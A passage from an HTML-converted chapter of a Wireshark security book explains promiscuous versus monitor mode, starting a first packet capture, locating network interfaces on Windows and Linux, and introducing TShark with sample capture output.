Mode</span></i></b><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" ><o:p></o:p></span></i></b></h4><p class=MsoBodyText  style="margin-top:7.8500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >During your research or other learning, you might have heard these two words, perhaps used interchangeably. Monitor mode does equate to sniffing, but as a term, it only applies to </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >wireless </span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >sniffing. An interface sniffing all packets on a wired network is in promiscuous mode.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >In the context of wireless sniffing, there is one big difference to capturing wireless traffic in promiscuous mode versus monitor mode.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section120" ><p class=MsoBodyText  style="margin-top:3.7500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Capturing wireless traffic in promiscuous mode means sniffing traffic while associated with an access point (AP). Similar to promiscuous mode for wired networks, you see all traffic destined for your host and for others. And all the traffic you see is going through the WLAN AP you and those other hosts are currently connected with.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;margin-right:5.7500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Monitor mode, on the other hand, means sniffing all traffic, from all access points. You&#8217;re not currently connected or associated with an AP. You&#8217;re seeing all wireless traffic transmitted, at least to the extent the RF signal strength provides and your antenna can detect. In fact, this applies to sniffing wireless traffic in both operating modes defined by the 802.11 standard: infrastructure mode (devices connect to an AP) and ad-hoc mode (devices connect to each other without an AP).</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h2 style="margin-top:15.2500pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >Starting the First Capture</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;margin-right:11.1500pt;" ><a name="_bookmark242" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >To start sniffing, launch Wireshark and look for the capture section in the home screen. If it looks somewhat like<a name="_bookmark243" ></a>&nbsp;</span><span><a href="#_bookmark244" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-1</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, you are good to go. If it shows an error message about not being able to find interfaces to capture on, check the setup instructions at the beginning of the book.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="120"  height="0" ></td></tr><tr><td></td><td><img width="778"  height="328"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker156377.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:6.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:9.3000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark244" ></a><span><a href="#_bookmark243" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-1:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >The Capture interfaces list</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.2500pt;margin-right:6.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >For a basic capture on your wired interface, the default options are okay; so, just click on eth0/em1 on Linux or Local Area Connection on Windows so that it is highlighted, and then click Start. By default, this</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section121" ><p class=MsoBodyText  style="margin-top:3.6000pt;margin-right:11.1500pt;line-height:101%;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >sets the interface you selected to promiscuous mode (more on that later) and starts listening for traffic.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="128.75"  height="0" ></td></tr><tr><td></td><td><img width="763"  height="424"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker156772.png" ></td></tr></table></span><span><table cellpadding="0"  cellspacing="0" ><tr><td width="120"  height="0" ></td></tr><tr><td></td><td><img width="781"  height="402"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker156773.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:5.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:5.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.2000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:3.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark246" ></a><span><a href="#_bookmark245" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-2:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Superuser warning</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.9500pt;" ><a name="_bookmark247" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >After you start sniffing, you almost immediately begin seeing some traffic in the display, as most network-capable devices are constantly generating some traffic. You should click around on the packets shown</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section122" ><p class=MsoBodyText  style="margin-top:4.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >in the packet list to familiarize yourself with the different panes of the interface and what kind of specific traffic you can see on your network.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;margin-right:9.0500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >As shown in<a name="_bookmark248" ></a>&nbsp;</span><span><a href="#_bookmark249" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-3</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, packets are captured and displayed within the first seconds of sniffing. Clicking on packet number 7 on the Packet List pane, you see a breakdown of the packet in the Packet Details pane. In the Packet Details pane, you might expand any subtree by clicking the subtree&#8217;s arrow on the immediate left. Note the arrow points right when the subtree is collapsed, and down when the subtree is expanded.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3500pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="120"  height="0" ></td></tr><tr><td></td><td><img width="781"  height="609"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker157650.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:7.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:8.6000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark249" ></a><span><a href="#_bookmark248" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-3:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >New traffic</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.2500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >You&#8217;ll see by the example packet that the Packet List pane highlights which packet is being shown. The Packet Details pane shows inside the packet through the applicable subtrees. Expanding one subtree, &#8220;Internet Protocol Version 4,&#8221; in the Packet Details pane shows the</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section123" ><p class=MsoBodyText  style="margin-top:4.4000pt;margin-right:11.1500pt;line-height:102%;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >packet&#8217;s source and destination IP addresses, as well as various flags and other IPv4 header information.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.4000pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="128.75"  height="0" ></td></tr><tr><td></td><td><img width="763"  height="494"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker158086.png" ></td></tr></table></span><span><table cellpadding="0"  cellspacing="0" ><tr><td width="130"  height="0" ></td></tr><tr><td></td><td><img width="762"  height="459"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker158087.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:4.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:5.5000pt;" ><o:p>&nbsp;</o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:11.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section124" ><p class=MsoNormal  style="margin-top:3.7500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark252" ></a><span><a href="#_bookmark251" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-4:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Renaming a network interface</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h4 style="margin-top:14.8500pt;" ><a name="_bookmark253" ></a><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" >Sniffing on Windows Versus Linux</span></i></b><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" ><o:p></o:p></span></i></b></h4><p class=MsoBodyText  style="margin-top:7.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >To find the right interface in Windows, follow these steps:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:7.7000pt;margin-right:0.0000pt;margin-bottom:0.0000pt;margin-left:30.5000pt;text-indent:-18.7500pt;text-align:left;mso-list:l4 level1 lfo4;" ><![if !supportLists]><span style="font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;" ><span style='mso-list:Ignore;' >1.<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Open a command prompt by pressing the Windows key + x or</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.4000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >by</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-left:30.5000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >searching for and executing </span><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" >cmd </span></b><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >in the Cortana search box or the Run dialog box.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:7.5500pt;margin-right:0.0000pt;margin-bottom:0.0000pt;margin-left:30.5000pt;text-indent:-20.2500pt;text-align:left;mso-list:l4 level1 lfo4;" ><![if !supportLists]><span style="font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;" ><span style='mso-list:Ignore;' >2.<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Type </span><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" >ipconfig /all </span></b><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >to list all the available network</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.3000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >interfaces.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:7.7500pt;margin-right:0.0000pt;margin-bottom:0.0000pt;margin-left:30.5000pt;text-indent:-20.2500pt;text-align:left;mso-list:l4 level1 lfo4;" ><![if !supportLists]><span style="font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;" ><span style='mso-list:Ignore;' >3.<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Check each interface for the IP configuration of your</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.8500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >network.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-left:30.5000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The name in the Wireshark list of interfaces corresponds with the name after &#8220;adapter&#8221; (for example, &#8220;Wi-Fi 4&#8221;).</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.5500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >To find the right interface in Linux, you follow similar steps:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:7.7000pt;margin-right:0.0000pt;margin-bottom:0.0000pt;margin-left:30.5000pt;text-indent:-18.7500pt;text-align:left;mso-list:l3 level1 lfo5;" ><![if !supportLists]><span style="font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;" ><span style='mso-list:Ignore;' >1.<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Open a terminal</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.2000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >window.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:7.7000pt;margin-right:0.0000pt;margin-bottom:0.0000pt;margin-left:30.5000pt;text-indent:-20.2500pt;text-align:left;mso-list:l3 level1 lfo5;" ><![if !supportLists]><span style="font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;" ><span style='mso-list:Ignore;' >2.<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Type </span><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" >ifconfig /all </span></b><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >to list all the available network</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.3000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >interfaces.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:7.7500pt;margin-right:0.0000pt;margin-bottom:0.0000pt;margin-left:30.5000pt;text-indent:-20.2500pt;text-align:left;mso-list:l3 level1 lfo5;" ><![if !supportLists]><span style="font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;" ><span style='mso-list:Ignore;' >3.<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Check each interface for the IP configuration of the</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.0000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >network.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:6.4500pt;margin-right:11.1500pt;" ><a name="_bookmark254" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Additionally, you can select Capture </span><span style="mso-spacerun:'yes';font-family:'MS UI Gothic';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:15.0000pt;" >&#8680; </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Options within Wireshark to open the Capture Interfaces window. From there you can see each interface, a small graphic portrayal of traffic, whether or not the interface is in promiscuous mode, its buffer size, and other interface details.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2000pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="128.75"  height="0" ></td></tr><tr><td></td><td><img width="763"  height="359"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker159133.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:5.0000pt;" ><o:p>&nbsp;</o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section125" ><p class=MsoBodyText  style="margin-left:13.2500pt;" ><span><span style="position:absolute;z-index:1;margin-left:0.0000px;margin-top:0.0000px;width:763.0000px;height:140.0000px;" ><img width="763"  height="140"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker159161.png" ></span></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:5.2500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >For now, experiment with what you&#8217;re able to see. The type of traffic you see in particular is, of course, somewhat limited to the traffic visible by your network interface. After a brief introduction to TShark, the command-line UI of Wireshark, we will delve deep into how to expand your visible traffic on the network.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h2 style="margin-top:15.1000pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >TShark</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.9000pt;margin-right:9.6500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >TShark is the lesser known UI of Wireshark&#8212;and in my opinion is highly underused. TShark is for when you want to impress your friends by ripping out packets from a Linux terminal like an</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.0500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >old-school Unix wizard. It is very similar in basic functionality to the revered tcpdump tool, but with all the added functionality of Wireshark, such as the easy packet filtering and the Lua scripting engine. In other words, it is tcpdump on steroids. When scripting for Wireshark, you usually end up using TShark, as opposed to the graphical interface, because it is more streamlined and better suited to further</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.7500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >scripting.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >For this chapter, we focus on the basics needed to get packets scrolling across your terminal.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The following code illustrates a typical TShark session. The packets are numbered followed by timestamp, source and destination addresses, protocol, length, and description&#8212;very much like the Wireshark GUI but in a textual representation.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:12.1500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >localhost:~$ tshark</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >31 5.064302000 192.168.178.30 -&#62; 173.194.67.103 TCP 74 48231 &#62;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >http [SYN] Seq=0</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:21.5500pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Win=29200 Len=0 MSS=1460 SACK_PERM=1 TSval=926223 TSecr=0 WS=1024</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.3500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >32 5.074492000 192.168.178.30 -&#62; 194.109.6.66 DNS 75 Standard</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >query</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.3000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >0x56dc</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >A</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.0500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >forums.kali.org</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >33 5.074987000 192.168.178.30 -&#62; 46.51.197.88 TCP 74 59132 &#62;</span><span 